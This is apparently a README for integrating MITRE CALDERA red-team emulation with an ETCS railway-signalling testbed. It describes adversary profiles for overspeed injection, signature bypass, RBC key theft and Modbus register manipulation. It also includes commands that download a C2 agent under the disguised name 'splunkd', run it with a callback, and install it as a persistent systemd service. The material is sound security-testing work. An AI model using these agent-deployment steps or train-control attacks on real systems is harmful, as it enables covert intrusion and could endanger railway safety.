# CALDERA Integration Guide for ETCS Testbed

## Overview
This guide explains how to integrate the ETCS testbed with MITRE CALDERA for automated adversarial testing and red team operations.

## Prerequisites

- CALDERA server installed (v4.0+)
- ETCS testbed running (bare metal or Docker)
- Python 3.8+ on CALDERA server
- Network connectivity between CALDERA and testbed

## Installation

### 1. Clone CALDERA
```bash
git clone https://github.com/mitre/caldera.git --recursive
cd caldera
```

### 2. Install ETCS Plugin
```bash
# Copy plugin to CALDERA plugins directory
cp -r /path/to/etcs_testbed/caldera plugins/etcs_testbed

# Install CALDERA dependencies
pip3 install -r requirements.txt
```

### 3. Enable Plugin
Edit `conf/local.yml`:
```yaml
plugins:
  - etcs_testbed
```

### 4. Start CALDERA
```bash
python3 server.py --insecure

# Access web UI at http://localhost:8888
# Default credentials: admin / admin
```

## Configuration

### Testbed Facts
Create initial facts for operation planning in CALDERA UI:

```yaml
# Target Configuration
etcs.gsmr_host: 127.0.0.1
etcs.gsmr_admin_port: 9100
etcs.evc_host: 127.0.0.1
etcs.evc_driver_port: 9102
etcs.modbus_host: 127.0.0.1
etcs.modbus_port: 502
etcs.modbus_slave_id: 1

# File Paths (for RBC compromise scenarios)
etcs.rbc_key_path: /app/rbc_key.txt
etcs.rbc_db_path: /app/rbc_db.json

# Attack Parameters
etcs.speed_limit: 300.0      # km/h for overspeed attacks
etcs.position_km: 99.9       # km for position spoofing
etcs.start_register: 0       # Modbus register scan start
etcs.register_count: 100     # Number of registers to scan
etcs.speed_increase: 100     # km/h to add to DB speed limits
```

## Available Adversaries

### 1. Network Attacker
**Profile**: `ETCS Network Attacker`

**Scenario**: Attacker with MITM on GSM-R network

**Abilities**:
- Signature bypass enable
- Overspeed injection
- Emergency brake injection

**Usage**:
1. Deploy agent on host with access to port 9100
2. Create operation with "ETCS Network Attacker" adversary
3. Run operation
4. Monitor DMI at http://localhost:8080

### 2. Train Insider
**Profile**: `ETCS Insider - Train Operator`

**Scenario**: Malicious train operator

**Abilities**:
- Disable signature verification
- Override speed controls

**Usage**:
1. Deploy agent with EVC driver access (port 9102)
2. Select "ETCS Insider - Train Operator" adversary
3. Execute operation

### 3. RBC Compromiser
**Profile**: `ETCS RBC Compromiser`

**Scenario**: Full RBC system compromise

**Abilities**:
- Key theft
- Database manipulation
- Valid signature forgery

**Usage**:
1. Deploy agent on RBC container/host
2. Use "ETCS RBC Compromiser" adversary
3. Collected keys enable subsequent forgery

### 4. Modbus Attacker
**Profile**: `ETCS Modbus Attacker`

**Scenario**: ICS-focused Modbus exploitation

**Abilities**:
- Register scanning
- Function code fuzzing
- Direct register manipulation

**Usage**:
1. Set `PROTOCOL=modbus_tcp` in testbed
2. Deploy agent with Modbus access (port 502)
3. Run "ETCS Modbus Attacker" operation

### 5. Advanced Persistent Threat
**Profile**: `ETCS Advanced Persistent Threat`

**Scenario**: Multi-stage nation-state attack

**Abilities**: All of the above in coordinated sequence

**Usage**:
1. Deploy agents on multiple systems
2. Select "ETCS Advanced Persistent Threat"
3. Monitor multi-stage execution

## Agent Deployment

### Manual Deployment
```bash
# On testbed host, download CALDERA agent
wget http://caldera-server:8888/file/download -O splunkd

chmod +x splunkd

# Start agent with callback to CALDERA
./splunkd -contact http://caldera-server:8888
```

### Docker Deployment
Add to `docker-compose.yml`:
```yaml
services:
  caldera-agent:
    image: mitre/sandcat
    environment:
      - CALDERA_SERVER=http://caldera:8888
      - CALDERA_GROUP=red
    networks:
      - public_net
      - onboard_net
    depends_on:
      - rbc
      - evc
```

### Persistent Agent
```bash
# Install as systemd service (Linux)
cat > /etc/systemd/system/caldera-agent.service << 'EOF'
[Unit]
Description=CALDERA Agent
After=network.target

[Service]
Type=simple
User=etcs
ExecStart=/opt/caldera/splunkd -contact http://caldera-server:8888
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF

systemctl enable caldera-agent
systemctl start caldera-agent
```

## Running Operations

### Quick Start
1. Navigate to CALDERA UI: http://localhost:8888
2. Login with credentials
3. Go to "Campaigns" → "Operations"
4. Click "Create Operation"
5. Configure:
   - **Name**: ETCS Network Attack Test
   - **Adversary**: ETCS Network Attacker
   - **Agent Group**: red
   - **Planner**: atomic
   - **Auto-close**: Yes
   - **Obfuscation**: plain-text
6. Click "Start"
7. Monitor execution in real-time
8. View results in "Debrief" tab

### Custom Operations
Create custom sequences in "Adversary Emulation" tab:
1. Select abilities from ETCS plugin
2. Drag to adversary profile
3. Set execution order
4. Configure facts/parameters
5. Save adversary
6. Use in operations

## Attack Scenarios

### Scenario 1: Network Overspeed
**Goal**: Inject MA causing train to exceed safe speed

**Steps**:
1. Ensure testbed is running with JSON protocol
2. Deploy agent with GSM-R access
3. Run "ETCS Network Attacker" operation
4. Watch DMI for speed increase

**Expected Result**:
- Train accelerates beyond zone limit
- DMI shows forged authority
- Event log shows "MA accepted with INVALID signature"

### Scenario 2: Modbus Direct Control
**Goal**: Bypass RBC using Modbus register writes

**Steps**:
1. Start testbed with `PROTOCOL=modbus_tcp`
2. Deploy agent with Modbus access
3. Run "ETCS Modbus Attacker" operation
4. Observe register manipulation

**Expected Result**:
- Speed limit changes immediately
- No signature required
- Direct control achieved

### Scenario 3: Key Theft & Forgery
**Goal**: Steal key and forge valid signed MAs

**Steps**:
1. Deploy agent on RBC system
2. Run "ETCS RBC Compromiser" operation
3. Key collected in CALDERA facts
4. Subsequent MAs signed validly

**Expected Result**:
- Key retrieved from plaintext file
- Forged MAs accepted in strict mode
- Complete authority compromise

## Monitoring & Analysis

### Live Monitoring
- **DMI Web UI**: http://localhost:8080
- **CALDERA Dashboard**: Operation execution view
- **Docker Logs**: `docker compose logs -f`
- **Network Traffic**: `tcpdump -i lo port 9100`

### Post-Operation Analysis
1. Review operation debrief in CALDERA
2. Export operation report (JSON/HTML)
3. Analyze attack graph and paths
4. Review collected facts and artifacts
5. Generate lessons learned

### Metrics
CALDERA tracks:
- Ability success/failure rates
- Execution times
- Fact discovery
- Network connections
- Command outputs

## Defensive Validation

### Blue Team Testing
1. Enable detection mechanisms
2. Run red team operations
3. Validate alerts fire correctly
4. Measure detection coverage
5. Improve defenses

### Purple Team Exercises
1. Red team: Execute attacks
2. Blue team: Monitor and respond
3. Collaborate on findings
4. Document gaps and improvements
5. Iterate defenses

## Troubleshooting

### Agent Not Connecting
**Problem**: Agent doesn't appear in CALDERA

**Solution**:
```bash
# Check network connectivity
curl http://caldera-server:8888/api/v2/health

# Verify agent command
./splunkd -contact http://caldera-server:8888 -v

# Check firewall rules
sudo ufw allow from caldera-server to any port 8888
```

### Ability Failures
**Problem**: Abilities fail to execute

**Solution**:
1. Check facts are set correctly
2. Verify target ports are accessible:
   ```bash
   nc -zv 127.0.0.1 9100  # GSM-R admin
   nc -zv 127.0.0.1 9102  # EVC driver
   nc -zv 127.0.0.1 502   # Modbus
   ```
3. Review ability output in CALDERA
4. Test ability manually on target
5. Check Python version (3.8+ required)

### Protocol Mismatch
**Problem**: Modbus abilities fail with JSON testbed

**Solution**:
```bash
# Ensure protocol matches
export PROTOCOL=modbus_tcp
docker compose down
docker compose up --build

# Or switch to JSON
export PROTOCOL=json
docker compose restart
```

### Permission Errors
**Problem**: Key/DB access denied

**Solution**:
```bash
# Check file permissions
ls -la /app/rbc_key.txt
ls -la /app/rbc_db.json

# Grant access if needed
chmod 644 /app/rbc_key.txt
chmod 644 /app/rbc_db.json
```

## Security Considerations

### Isolated Network
Run CALDERA operations in isolated testbed network:
```yaml
networks:
  testbed_net:
    driver: bridge
    internal: true  # No internet access
```

### Credential Management
- Change default CALDERA credentials
- Use API keys for agent auth
- Rotate keys regularly
- Audit access logs

### Data Handling
- Sanitize operation reports before sharing
- Redact sensitive information
- Encrypt stored operations
- Implement retention policies

## Advanced Topics

### Custom Abilities
Create new abilities in `caldera/data/abilities/`:
```yaml
---
id: custom-ability-uuid
name: My Custom Attack
description: Custom ETCS attack ability
tactic: impact
technique:
  attack_id: T0000
  name: Custom Technique
platforms:
  linux:
    sh:
      command: |
        # Your custom attack code
```

### Custom Parsers
Parse ability output in `caldera/app/parsers/`:
```python
from app.utility.base_parser import BaseParser

class EtcsParser(BaseParser):
    def parse(self, blob):
        # Extract facts from output
        for line in blob.split('\n'):
            if 'SUCCESS' in line:
                # Create fact
                pass
```

### Integration with CI/CD
```yaml
# .gitlab-ci.yml or .github/workflows/caldera.yml
etcs_security_test:
  script:
    - docker compose -f docker-compose.caldera.yml up -d
    - ./run_caldera_operation.sh "ETCS Network Attacker"
    - ./check_results.sh
```

## References

- [CALDERA Documentation](https://caldera.readthedocs.io/)
- [MITRE ATT&CK for ICS](https://attack.mitre.org/tactics/ics/)
- [ETCS Testbed Architecture](../docs/ARCHITECTURE.md)
- [Modbus Protocol Guide](../docs/MODBUS_PROTOCOL.md)

## Support

- Issues: https://github.com/Nima76/etcs_testbed/issues
- CALDERA: https://github.com/mitre/caldera
- ICS Security: https://www.cisa.gov/ics
